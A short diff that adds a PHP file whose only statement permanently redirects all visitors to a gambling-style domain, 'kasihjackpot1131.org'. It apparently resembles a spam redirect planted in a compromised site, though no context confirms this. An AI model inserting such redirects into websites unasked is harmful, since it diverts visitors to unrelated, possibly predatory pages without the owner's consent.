@@ -1,0 +1,3 @@
+<?php
+
+header('Location: https://kasihjackpot1131.org/', true, 301);
